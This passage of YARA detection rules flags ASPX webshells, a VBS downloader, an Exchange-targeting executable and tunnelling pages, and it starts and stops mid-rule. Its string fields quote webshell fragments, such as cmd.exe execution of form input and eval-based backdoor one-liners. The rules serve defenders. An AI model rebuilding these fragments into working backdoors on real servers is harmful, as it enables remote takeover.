      $s4 = "EncryptionModule EncryptionDll = GetParam(\"EncryptionDll\") as EncryptionModule;" fullword ascii
      $s5 = "return new ConfigPackage(this.PackageBuffer, this.Encryptor);" fullword ascii
      $s6 = "HttpContext.Current.Response.Write(\"200\\n\" + BitConverter.ToString(Encoding.UTF8.GetBytes(EncryptionDll.EncryptionAssembly.Fu" ascii
      $s7 = "public EncryptionModule(string dll_base64, string ns, byte[] key)" fullword ascii
      $s8 = "WriteError(ex.ToString(), ErrorPlaces.OnConnect, EncryptionDll);" fullword ascii
      $s9 = "WriteError(ex.ToString(), ErrorPlaces.OnReceive, EncryptionDll);" fullword ascii
      $s10 = "var txt_buffer = this.Encoder.GetBytes(string.Join(this.LF.ToString(), Nodes) + this.LF);" fullword ascii
      $s11 = "this.PackageBuffer = encryptor.decrypt(buffer);" fullword ascii
      $s12 = "var tmp = this.Encryptor.decrypt(buffer);" fullword ascii
      $s13 = "return new ErrorPackage(this.PackageBuffer, this.Encryptor);" fullword ascii
      $s14 = "HttpContext.Current.Server.ScriptTimeout = CPackage.Timeout;" fullword ascii
      $s15 = "this.Buffer = Convert.FromBase64String(dll_base64);" fullword ascii
      $s16 = "const string DllKey = \"EncryptionDll\";" fullword ascii
      $s17 = "this.Data = Convert.FromBase64String(Nodes[0]);" fullword ascii
      $s18 = "public PackageManager(byte[] buffer, EncryptionModule encryptor)" fullword ascii
      $s19 = "Session[DllKey] = CPackage.EncryptionAssembly;" fullword ascii
      $s20 = "ConfigPackage CPackage = Package.GetPackage() as ConfigPackage;" fullword ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 70KB and
        ( 2 of ($x*) and 13 of ($s*) )
      ) or ( all of them )
}
rule WC_topnavs {
   meta:
      description = "topnavs.aspx"
      date = "2020-02-07"
      hash1 = "868f14da474cc5227f3afecf55054082759a968ba0504bcc7b2c152438bab573"
   strings:
      $s1 = "<%@ Page Language=\"C#\" EnableViewState=\"false\" %> <% var Q =Request.Form[\"key\"];var D =Request.Form[\"buffer\"];if(Q!=null" ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 2KB and
        ( all of ($s*) )
      ) or ( all of them )
}
rule WC_up {
   meta:
      description = "up.aspx"
      date = "2020-02-07"
      hash1 = "83a1b65752d542143599553dfeebfe07fb45c4c2647a1b12f0ad565239928fa7"
   strings:
      $s1 = "StatusLabel.Text = \"Upload status: The file could not be uploaded. The following error occured: \" + ex.Message;" fullword ascii
      $s2 = "string filename = System.IO.Path.GetFileName(FileUploadControl.FileName);" fullword ascii
      $s3 = "<asp:Button runat=\"server\" id=\"UploadButton\" text=\"Upload\" onclick=\"UploadButton_Click\" />" fullword ascii
      $s4 = "FileUploadControl.SaveAs(Server.MapPath(\"~/\") + filename);" fullword ascii
      $s5 = "<asp:Label runat=\"server\" id=\"StatusLabel\" text=\"Upload status: \" />" fullword ascii
      $s6 = "<asp:FileUpload id=\"FileUploadControl\" runat=\"server\" />" fullword ascii
      $s7 = "StatusLabel.Text = \"Upload status: File uploaded!\";" fullword ascii
      $s8 = "protected void UploadButton_Click(object sender, EventArgs e)" fullword ascii
      $s9 = "<form id=\"form1\" runat=\"server\">" fullword ascii
      $s10 = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\"%>" fullword ascii
      $s11 = "if (FileUploadControl.HasFile)" fullword ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 3KB and
        ( 9 of ($s*) )
      ) or ( all of them )
}
rule WC_cmd__2_ {
   meta:
      description = "cmd (2).aspx"
      date = "2020-02-07"
      hash1 = "ddbad2b53c1a98547124952307796f6334528ab6b2d15bdcb33142cfd4e11512"
   strings:
      $x1 = "<%-- TurkisH-RuleZ SheLL v0.2 - CMD Version --%>" fullword ascii
      $x2 = "<h2><font color=\"#FF0000\"># Command  Line Shell Priv8&nbsp;</font></h2>" fullword ascii
      $s3 = "lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();" fullword ascii
      $s4 = "p.StartInfo.FileName = \"cmd.exe\";" fullword ascii
      $s5 = "// Executing Command'z " fullword ascii
      $s6 = "<%--  www.sec4ever.com  | www.sec-t.net --%>" fullword ascii
      $s7 = "p.StartInfo.UseShellExecute = false;" fullword ascii
      $s8 = "&nbsp; &nbsp;<asp:Button runat=\"server\" ID=\"cmdExec\" Text=\"Execute\" BackColor=\"Black\" Font-Bold=\"True\" ForeColor=\"Whi" ascii
      $s9 = "<%@ Import Namespace=\"System.Web.UI.WebControls\" %>" fullword ascii
      $s10 = "<pre><asp:Literal runat=\"server\" ID=\"lblCmdOut\" Mode=\"Encode\" /></pre>" fullword ascii
      $s11 = "Process p = new Process();" fullword ascii
      $s12 = "p.StartInfo.Arguments = \"/c \" + txtCmdIn.Text;" fullword ascii
      $s13 = "<table border=\"0\" width=\"100%\" id=\"table1\" cellspacing=\"0\" cellpadding=\"0\" bgcolor=\"#CC8CED\">" fullword ascii
      $s14 = "* { font-family: Arial; font-size: 12px; }" fullword ascii
      $s15 = "<title># TurkisH-RuleZ SheLL</title>" fullword ascii
      $s16 = "protected void cmdUpload_Click(object sender, EventArgs e)" fullword ascii
      $s17 = "h2 { font-size: 14px; background-color: #000000; color: #ffffff; padding: 2px; }" fullword ascii
      $s18 = "protected void txtCmdIn_TextChanged(object sender, EventArgs e)" fullword ascii
      $s19 = "h1 { font-size: 16px; background-color: #000000; color: #ffffff; padding: 5px; }" fullword ascii
      $s20 = "pre { font-family: Courier New; background-color: #c7c7c7;  }" fullword ascii
   condition:
      ( uint16(0) == 0xbbef and
        filesize < 8KB and
        ( 1 of ($x*) and 10 of ($s*) )
      ) or ( all of them )
}
rule WC_wget {
   meta:
      description = "wget.vbs"
      date = "2020-02-07"
      hash1 = "64bf5c455d9e1a97a5f8b8c714102029b85985f9f912d8ea3ddc619abc73d044"
   strings:
      $s1 = "http.Open \"GET\", strURL, False " fullword ascii
      $s2 = "ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) " fullword ascii
      $s3 = "If http Is Nothing Then Set http = CreateObject(\"WinHttp.WinHttpRequest\") " fullword ascii
      $s4 = "If http Is Nothing Then Set http = CreateObject(\"MSXML2.ServerXMLHTTP\") " fullword ascii
      $s5 = "Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 " fullword ascii
      $s6 = "If http Is Nothing Then Set http = CreateObject(\"Microsoft.XMLHTTP\") " fullword ascii
      $s7 = "Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts " fullword ascii
      $s8 = "Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") " fullword ascii
      $s9 = "Set fs = CreateObject(\"Scripting.FileSystemObject\") " fullword ascii
      $s10 = "Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 " fullword ascii
      $s11 = "Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 " fullword ascii
      $s12 = "Const HTTPREQUEST_PROXYSETTING_PROXY = 2 " fullword ascii
      $s13 = "http.Send " fullword ascii
      $s14 = "strUrl = WScript.Arguments.Item(0) " fullword ascii
      $s15 = "varByteArray = http.ResponseBody " fullword ascii
      $s16 = "StrFile = WScript.Arguments.Item(1) " fullword ascii
      $s17 = "Set http = Nothing " fullword ascii
      $s18 = "Set ts = fs.CreateTextFile(StrFile, True) " fullword ascii
      $s19 = "For lngCounter = 0 to UBound(varByteArray) " fullword ascii
      $s20 = "Err.Clear " fullword ascii
   condition:
      ( uint16(0) == 0x7473 and
        filesize < 2KB and
        ( 14 of ($s*) )
      ) or ( all of them )
}
rule AppIDSvc {
   meta:
      description = "AppIDSvc.exe"
      date = "2020-02-07"
      hash1 = "fd357b3449d77aefd6821fbdc8a8b66b047bf271fc703367c4fc7a60e9595134"
   strings:
      $x1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aBj" fullword ascii
      $x2 = "119115cmd.exe" fullword wide
      $x3 = "ProcessIdSystem.Net.NetworkInformation.NetworkInterface, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e0" wide
      $s4 = "get_RemoveUnpackedFilesAfterExecute" fullword ascii
      $s5 = "401112user32.dllhomaland_cellerkIBDKvURMmwMISxERWGaGjuTYiOnVgtOq" fullword wide
      $s6 = "Microsoft.Exchange.Management.exe" fullword wide
      $s7 = "System.Collections.Generic.IEnumerator<Ionic.Zip.ZipEntry>.get_Current" fullword ascii
      $s8 = "get_LastVerbExecuted" fullword ascii
      $s9 = "Task_Manager_Download_Execute" fullword ascii
      $s10 = "Ionic.Zip.Forms.ZipContentsDialog.resources" fullword ascii
      $s11 = "RXh0ZW5kZWRQcm9wZXJ0eQ==0MDAwNjIwMGEtMDAwMC0wMDAwLWMwMDAtMDAwMDAwMDAwMDQ20MDAwNjIwMGUtMDAwMC0wMDAwLWMwMDAtMDAwMDAwMDAwMDQ2" fullword ascii
      $s12 = "get_LastVerbExecutionTime" fullword ascii
      $s13 = "<RemoveUnpackedFilesAfterExecute>k__BackingField" fullword ascii
      $s14 = "PEFwcGx5Q29udmVyc2F0aW9uQWN0aW9uIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL2V4Y2hhbmdlL3NlcnZpY2VzLzIwMDYvbWVzc2FnZXMiIHht" ascii /* base64 encoded string '<ApplyConversationAction xmlns="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">' */
      $s15 = "IiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS9leGNoYW5nZS9zZXJ2aWNlcy8yMDA2L21lc3NhZ2VzIiB4bWxuczp0PSJodHRwOi8vc2NoZW1hcy5t" ascii /* base64 encoded string '" xmlns="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">' */
      $s16 = "PFJlbW92ZURlbGVnYXRlIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL2V4Y2hhbmdlL3NlcnZpY2VzLzIwMDYvbWVzc2FnZXMiIHhtbG5zOnQ9Imh0" ascii /* base64 encoded string '<RemoveDelegate xmlns="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">' */
      $s17 = "PEdldFJlbWluZGVycyB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS9leGNoYW5nZS9zZXJ2aWNlcy8yMDA2L21lc3NhZ2VzIiB4bWxuczp0PSJodHRw" ascii /* base64 encoded string '<GetReminders xmlns="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">' */
      $s18 = "PEdldFNlcnZpY2VDb25maWd1cmF0aW9uIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL2V4Y2hhbmdlL3NlcnZpY2VzLzIwMDYvbWVzc2FnZXMiIHht" ascii /* base64 encoded string '<GetServiceConfiguration xmlns="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">' */
      $s19 = "PEdldEFwcE1hbmlmZXN0cyB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS9leGNoYW5nZS9zZXJ2aWNlcy8yMDA2L21lc3NhZ2VzIiB4bWxuczp0PSJo" ascii /* base64 encoded string '<GetAppManifests xmlns="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"></GetAppManifests>' */
      $s20 = "PFN1YnNjcmliZSB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS9leGNoYW5nZS9zZXJ2aWNlcy8yMDA2L21lc3NhZ2VzIiB4bWxuczp0PSJodHRwOi8v" ascii /* base64 encoded string '<Subscribe xmlns="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">' */
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 7000KB and
        ( 2 of ($x*) and 10 of ($s*) )
      ) or ( all of them )
}
rule GetCLSID {
   meta:
      description = "GetCLSID.ps1"
      date = "2020-02-07"
      hash1 = "5404cfacc7ee44453b3b0a9bbb21d00bac56045e215c9f1cf68f46a8fb85b9d8"
   strings:
      $x1 = "$RESULT | Export-Csv -Path \".\\$TARGET\\CLSIDs.csv\" -Encoding ascii -NoTypeInformation" fullword ascii
      $x2 = "$OS = (Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption).Trim() -Replace \"Microsoft \", \"\"" fullword ascii
      $x3 = "$RESULT | Select CLSID -ExpandProperty CLSID | Out-File -FilePath \".\\$TARGET\\CLSID.list\" -Encoding ascii" fullword ascii
      $x4 = "$CLSID = Get-ItemProperty HKCR:\\clsid\\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}} | where-object {$_.appid -ne $n" ascii
      $s5 = "$APPID = Get-ItemProperty HKCR:\\appid\\* | select-object localservice,@{N='AppID'; E={$_.pschildname}} | where-object {$_.Local" ascii
      $s6 = "New-Item -ItemType Directory -Force -Path .\\$TARGET" fullword ascii
      $s7 = "$TARGET = $OS -Replace \" \",\"_\"" fullword ascii
      $s8 = "# Make target folder" fullword ascii
      $s9 = "New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT" fullword ascii
      $s10 = "This script extracts CLSIDs and AppIDs related to LocalService.DESCRIPTION" fullword ascii
      $s11 = "# Importing some requirements" fullword ascii
      $s12 = "# Export CLSIDs list" fullword ascii
      $s13 = "$ErrorActionPreference = \"Stop\"" fullword ascii
      $s14 = ". .\\Join-Object.ps1" fullword ascii
      $s15 = "# Preparing to Output" fullword ascii
      $s16 = "# Output in a CSV" fullword ascii
      $s17 = "Then exports to CSV" fullword ascii
      $s18 = "# Visual Table" fullword ascii
      $s19 = "$RESULT = Join-Object -Left $APPID -Right $CLSID -LeftJoinProperty AppID -RightJoinProperty AppID -Type AllInRight  | Sort-Objec" ascii
   condition:
      ( uint16(0) == 0x233c and
        filesize < 3KB and
        ( 3 of ($x*) and 10 of ($s*) )
      ) or ( all of them )
}
rule CmsSlwpAddEditLink2 {
   meta:
      description = "CmsSlwpAddEditLink2.aspx"
      date = "2020-02-07"
      hash1 = "420254185c31c6adc301321e4c4fd1502e40bc1ab93d013426607a0784a5c2ee"
   strings:
      $s1 = "<%@ Page Language=\"C#\" EnableViewState=\"false\" %> <% var Q =Request.Form[\"key\"];var D =Request.Form[\"buffer\"];if(Q!=null" ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 2KB and
        ( all of ($s*) )
      ) or ( all of them )
}
rule Uninstall {
   meta:
      description = "Uninstall.exe"
      date = "2020-02-07"
      hash1 = "c2ad4dffd5458176d22a5c081058ae060fd7e0ec227a0dba8634adf908d5d26b"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii
      $s2 = "NmapInstaller.exe" fullword wide
      $s3 = "Copyright (c) Insecure.Com LLC (fyodor@insecure.org)" fullword wide
      $s4 = "\\libeay32.dll" fullword ascii
      $s5 = "\\libssh2.dll" fullword ascii
      $s6 = "\\zlibwapi.dll" fullword ascii
      $s7 = "\\python27.dll" fullword ascii
      $s8 = "\\ssleay32.dll" fullword ascii
      $s9 = "Insecure.Com LLC1" fullword ascii
      $s10 = "Insecure.Com LLC0" fullword ascii
      $s11 = "\\Nmap\\Nmap - Zenmap GUI.lnk" fullword ascii
      $s12 = "\\Nmap - Zenmap GUI.lnk" fullword ascii
      $s13 = "\\nping.exe" fullword ascii
      $s14 = "\\ndiff.exe" fullword ascii
      $s15 = "\\zenmap.exe" fullword ascii
      $s16 = "\\nmap.exe" fullword ascii
      $s17 = "\\3rd-party-licenses.txt" fullword ascii
      $s18 = "\\nmap-payloads" fullword ascii
      $s19 = "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Nmap" fullword ascii
      $s20 = "\\Documents and Settings" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 200KB and
        pe.imphash() == "b76363e9cb88bf9390860da8e50999d2" and
        ( 1 of ($x*) and 10 of ($s*) )
      ) or ( all of them )
}
rule WC_scopes {
   meta:
      description = "scopes.aspx"
      date = "2020-02-07"
      hash1 = "8fdd00243ba68cadd175af0cbaf860218e08f42e715a998d6183d7c7462a3b5b"
   strings:
      $s1 = "<%@ Page Language=\"C#\" EnableViewState=\"false\" %><% var Q =Request.Form[\"key\"];var D =Request.Form[\"buffer\"];if(Q!=null&" ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 2KB and
        ( all of ($s*) )
      ) or ( all of them )
}
rule WC_cmd {
   meta:
      description = "cmd.aspx"
      date = "2020-02-07"
      hash1 = "17e53134aa4798a032296e4a80908ca83b043b05f5f4b0eb7d7f0be20213468e"
   strings:
      $x1 = "<script language=\"c#\" runat=\"server\">string E(string a){var psi=new System.Diagnostics.ProcessStartInfo();psi.FileName=\"cmd" ascii
   condition:
      ( uint16(0) == 0x733c and
        filesize < 2KB and
        ( 1 of ($x*) )
      ) or ( all of them )
}
rule WC_cmd__4_ {
   meta:
      description = "cmd (4).aspx"
      date = "2020-02-07"
      hash1 = "bb8213417bb5b58ed98cc9948853cd64b6cc0387f414122c946c4212b6c7a82d"
   strings:
      $x1 = "Response.Write(Server.HtmlEncode(this.ExecuteCommand(txtCommand.Text)));" fullword ascii
      $x2 = "processStartInfo.Arguments = \"/c \" + command;" fullword ascii
      $x3 = "processStartInfo.UseShellExecute = false;" fullword ascii
      $x4 = "private string ExecuteCommand(string command)" fullword ascii
      $x5 = "<td><asp:Button ID=\"btnExecute\" runat=\"server\" OnClick=\"btnExecute_Click\" Text=\"Execute\" /></td>" fullword ascii
      $s6 = "processStartInfo.FileName = \"c\"+\"m\"+\"d\"+\".\"+\"e\"+\"x\"+\"e\";" fullword ascii
      $s7 = "<td><asp:TextBox ID=\"txtCommand\" runat=\"server\" Width=\"820px\"></asp:TextBox></td>" fullword ascii
      $s8 = "protected void btnExecute_Click(object sender, EventArgs e)" fullword ascii
      $s9 = "processStartInfo.RedirectStandardOutput = true;" fullword ascii
      $s10 = "ProcessStartInfo processStartInfo = new ProcessStartInfo();" fullword ascii
      $s11 = "using (StreamReader streamReader = process.StandardOutput)" fullword ascii
      $s12 = "Process process = Process.Start(processStartInfo);" fullword ascii
      $s13 = "<td><asp:TextBox id=\"txtAuthKey\" runat=\"server\"></asp:TextBox></td>" fullword ascii
      $s14 = "<form id=\"formCommand\" runat=\"server\">" fullword ascii
      $s15 = "private const string AUTHKEY = \"20TyG6eQqEopbFMB\";" fullword ascii
      $s16 = "<head id=\"Head1\" runat=\"server\">" fullword ascii
      $s17 = "<td width=\"30\">Command:</td>" fullword ascii
      $s18 = "private const string HEADER = \"<html>\\n<head>\\n<title>command</title>\\n<style type=\\\"text/css\\\"><!--\\nbody,table,p,pre," ascii
      $s19 = "<title>Command</title>" fullword ascii
      $s20 = "private const string FOOTER = \"</body>\\n</html>\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 7KB and
        ( 3 of ($x*) and 8 of ($s*) )
      ) or ( all of them )
}
rule WC_signin {
   meta:
      description = "signin.aspx"
      date = "2020-02-07"
      hash1 = "c0419b5be91a474810bd805b418033f20fa4f11460de88583ef6aa2ed872f8cb"
   strings:
      $x1 = "popup(popup(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"UmVxdWVzdC5JdGVtWyJ0Il0=\"))));" fullword ascii
      $s2 = "<script runat=\"server\" language=\"Jscript\">" fullword ascii
      $s3 = "var a = q + \"ns\" + w;" fullword ascii
      $s4 = "function popup(str){" fullword ascii
      $s5 = "var b = eval(str,a);" fullword ascii
      $s6 = "var w = \"afe\";" fullword ascii
   condition:
      ( uint16(0) == 0x733c and
        filesize < 1KB and
        ( 1 of ($x*) and all of ($s*) )
      ) or ( all of them )
}
rule WC_config {
   meta:
      description = "config.aspx"
      date = "2020-02-07"
      hash1 = "13d27ecfbb6b3d55bdabcaa3a2ade83ecfaa3df92dbc22be05e6d9e2d18087b6"
   strings:
      $s1 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"sky5crack\"],\"unsafe\");%>" fullword ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 1KB and
        ( all of ($s*) )
      ) or ( all of them )
}
rule WC_IPGeter {
   meta:
      description = "IPGeter.exe"
      date = "2020-02-07"
      hash1 = "d16bf663912737b3e10ad37f3aaa2a4d1befa9bd965ecef04ade4aa3232b4028"
   strings:
      $s1 = "IPGeter.exe" fullword wide
      $s2 = "ProcessInformationLength" fullword ascii
      $s3 = "ProcessInformation" fullword ascii
      $s4 = "SVBHZXRlcio=" fullword wide /* base64 encoded string 'IPGeter*' */
      $s5 = "SVBHZXRlciQ=" fullword wide /* base64 encoded string 'IPGeter$' */
      $s6 = "SVBHZXRlciU=" fullword wide /* base64 encoded string 'IPGeter%' */
      $s7 = "dynamic method does not support fault clause" fullword wide
      $s8 = "IPGeter.Properties" fullword ascii
      $s9 = "ProcessInformationClass" fullword ascii
      $s10 = "unexpected OperandType " fullword wide
      $s11 = "_Encrypted$" fullword wide
      $s12 = "15.9.0.0" fullword ascii
      $s13 = "IPGeter$" fullword ascii
      $s14 = "IPGeter%" fullword ascii
      $s15 = "15.0.0.0" fullword ascii
      $s16 = "\"3D9B94A98B-76A8-4810-B1A0-4BE7C4F9C98DA2#" fullword wide
      $s17 = "IPGeter" fullword wide
      $s18 = "set_ThemeAuthor" fullword ascii
      $s19 = "debugPort" fullword ascii
      $s20 = "$c0868666-d5cf-4f74-be75-62446a0ad1b0" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 2000KB and
        ( 14 of ($s*) )
      ) or ( all of them )
}
rule sig_6dbbec97_4de1_49b9_872a_d67f2dede5c5 {
   meta:
      description = "6dbbec97-4de1-49b9-872a-d67f2dede5c5.aspx"
      date = "2020-02-07"
      hash1 = "349478d4800dee5044e9562b57bb2402d1889356ad805e6dd371ce8f96064987"
   strings:
      $x1 = "System.Diagnostics.ProcessStartInfo sinf = new System.Diagnostics.ProcessStartInfo(\"cmd\", \"/c \" + this.txt.Text + \"\");" fullword ascii
      $x2 = "<meta content=\"http://schemas.microsoft.com/intellisense/ie5\" name=\"vs_targetSchema\">" fullword ascii
      $x3 = "Response.Redirect(Request.ServerVariables[\"SCRIPT_NAME\"] + \"?d=\" + e.CommandArgument.ToString());" fullword ascii
      $x4 = "]----------- ThE WhitE WolF (the_white_lf_x@hotmail.com -------------------[</a>" fullword ascii
      $x5 = "** Description : Shell ASPX for All  Version Frame Work" fullword ascii
      $x6 = "<asp:Button Text=\"Execute\" OnClick=\"ADD_Click\" Runat=\"server\" ID=\"Button1\" BackColor=\"#666666\" " fullword ascii
      $x7 = "Response.AddHeader(\"Content-Disposition\", \"attachment; filename=\" + filename);" fullword ascii
      $x8 = "<asp:TemplateColumn HeaderText=\" [Download] \" HeaderStyle-Font-Size=\"10\">" fullword ascii
      $x9 = "[DllImport(\"kernel32.dll\", EntryPoint = \"GetDriveTypeA\")]" fullword ascii
      $x10 = "system0.Text = Environment.OSVersion.ToString() + \"(Windows NT 3.51)\";" fullword ascii
      $s11 = "system0.Text = Environment.OSVersion.ToString() + \"(Windows NT 4.0)\";" fullword ascii
      $s12 = "Response.Redirect(Request.ServerVariables[\"SCRIPT_NAME\"] + \"?d=\" + this.Drivers.SelectedValue);" fullword ascii
      $s13 = "Response.Redirect(Request.ServerVariables[\"SCRIPT_NAME\"] + \"?d=\" + this.txtPath.Text);" fullword ascii
      $s14 = "<asp:LinkButton ID=\"lnkExec\" runat=\"server\" onclick=\"lnkExec_Click\">[Execute " fullword ascii
      $s15 = "&nbsp;<font color=\"#00FF00\" style=\"text-align: center\"><asp:Label ID=\"lblCommand\" runat=\"server\"  " fullword ascii
      $s16 = "fileSystemRow[\"Download\"] = \"<font size=4 align=center algin=cenetre face=wingdings color=WhiteSmoke ><</font>\";" fullword ascii
      $s17 = "/*  if ((File1.PostedFile != null) && (File1.PostedFile.ContentLength > 0))" fullword ascii
      $s18 = "Response.Redirect(\"http://\"+Request.ServerVariables[\"SERVER_NAME\"]+Request.ServerVariables[\"SCRIPT_NAME\"]);" fullword ascii
      $s19 = "ASPX SheLL / Yee7 Team]-----------<font color=\"Black\"  face=\"webdings\" size=\"6\" >N</font>------------</td>" fullword ascii
      $s20 = "CommandName='<%# DataBinder.Eval(Container, \"DataItem.Download\") %>' " fullword ascii
   condition:
      ( uint16(0) == 0x213c and
        filesize < 100KB and
        ( 7 of ($x*) and all of ($s*) )
      ) or ( all of them )
}
rule WC_info2 {
   meta:
      description = "info2.aspx"
      date = "2020-02-07"
      hash1 = "eba2dd6dd66f576131cf383641b5b114a6aac426de2018452afc2a54f4858f48"
   strings:
      $x1 = "<input class=\"input\" runat=\"server\" id=\"kusi\" type=\"text\" size=\"100\" value=\"c:\\windows\\system32\\cmd.exe\" />" fullword ascii
      $x2 = "td.Text = \"<a href=\\\"javascript:Bin_PostBack('urJG','\" + dt.Rows[j][\"ProcessID\"].ToString() + \"')\\\">Kill</a>\";" fullword ascii
      $x3 = "size=\"100\" value=\"cmd.exe /c net user\" />" fullword ascii
      $x4 = "vyX.Text += \"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\" + MVVJ(rootkey) + \"')\\\">\" + rootkey + \"</a> | \";" fullword ascii
      $x5 = "string iVDT = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:\\\\\\r" ascii
      $x6 = "tc.Text = \"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\" + MVVJ(rootkey) + \"')\\\">\" + rootkey + \"</a>\";" fullword ascii
      $x7 = "<%@ Assembly Name=\"System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\" %>" fullword ascii
      $x8 = "tc.Text = \"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\" + MVVJ(cJG) + \"')\\\">Parent Key</a>\";" fullword ascii
      $x9 = "GLpi.Text = \"<a href=\\\"#\\\" onclick=\\\"Bin_PostBack('ksGR','\" + MVVJ(AXSbb.Value + Bin_Files.Name) + \"')\\\">" fullword ascii
      $x10 = "yEwc.Append(\"<li><u>Server Time : </u>\" + System.DateTime.Now.ToString() + \"</li>\");" fullword ascii
      $x11 = "<%@ Assembly Name=\"System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\" %>" fullword ascii
      $x12 = "[DllImport(\"kernel32.dll\", EntryPoint = \"GetDriveTypeA\")]" fullword ascii
      $x13 = "foreach (ManagementObject p in PhQTd(\"Select * from Win32_Process Where ProcessID ='\" + pid + \"'\"))" fullword ascii
      $s14 = "string txc = @\"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG\";" fullword ascii
      $s15 = "ServiceController[] kQmRu = System.ServiceProcess.ServiceController.GetServices();" fullword ascii
      $s16 = "nxeDR.Command += new CommandEventHandler(this.iVk);" fullword ascii
      $s17 = "<%@ Assembly Name=\"System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\" %>" fullword ascii
      $s18 = ".Bin_Style_Login{font-size: 12px; font-family:Tahoma;background-color:#ddd;border:1px solid #fff;}" fullword ascii
      $s19 = "if (Request[\"__EVENTTARGET\"] == \"Bin_Editfile\" || Request[\"__EVENTTARGET\"] == \"Bin_Createfile\")" fullword ascii
      $s20 = "Response.AddHeader(\"Content-Disposition\", \"attachment;filename=\" + HttpUtility.UrlEncode(fs.Name, System.Text.Encoding.UTF8)" ascii
   condition:
      ( uint16(0) == 0xbbef and
        filesize < 300KB and
        ( 8 of ($x*) and all of ($s*) )
      ) or ( all of them )
}
rule workflow_list {
   meta:
      description = "workflow_list.aspx"
      date = "2020-02-07"
      hash1 = "66912cbe59093bb3dbac354d3711d2539d3131f1e869d7e8e9dfc77d93605fae"
   strings:
      $x1 = "//process1.StartInfo.FileName = \"C:\\\\WINDOWS\\\\TEMP\\\\socks4aServer.exe\";" fullword ascii
      $x2 = "IPHostEntry ipHostInfo = Dns.GetHostByAddress(((String) Session[\"ip\"])); //Dns.GetHostByName" fullword ascii
      $s3 = "HttpContext.Current.Response.Write(\"[Server] Missing Arguments \"+(string) Session[\"ip\"]+Session[\"port\"]);" fullword ascii
      $s4 = "process1.StartInfo.Arguments = (String) Session[\"port\"].ToString();" fullword ascii
      $s5 = "process1.StartInfo.FileName = (String)Session[\"file\"];" fullword ascii
      $s6 = "//http://www.secforce.com / nikos.vassakis <at> secforce.com" fullword ascii
      $s7 = "System.Diagnostics.Process process1 = new System.Diagnostics.Process();" fullword ascii
      $s8 = "foreach (System.Diagnostics.Process proc in System.Diagnostics.Process.GetProcessesByName(Path.GetFileName((String)Session[\"fil" ascii
      $s9 = "ipHostInfo = Dns.GetHostByAddress(ip); //Dns.GetHostByName" fullword ascii
      $s10 = "Response.Cookies.Add(new HttpCookie(\"ASP.NET_SessionId\",\"\"));" fullword ascii
      $s11 = "string SaveLocation = Path.GetTempPath() + \"\\\\\" +  fn;" fullword ascii
      $s12 = "Session[\"SocksProcess\"]=process1;" fullword ascii
      $s13 = "byte[] postData = Request.BinaryRead(Request.TotalBytes);" fullword ascii
